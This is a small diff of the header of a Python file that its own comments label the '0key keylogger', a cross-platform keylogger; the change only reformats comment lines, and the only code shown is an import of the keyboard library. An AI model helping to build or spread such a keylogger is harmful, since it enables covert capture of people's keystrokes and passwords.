@@ -1,9 +1,10 @@
-# -
+# ------------------------------------
 # python3.12.2
 # 0key keylogger 
 # windows - linux - Macos
 # github - gitlab
-# -- 
+# ------------------------------------
+
 # - 
 
 import keyboard
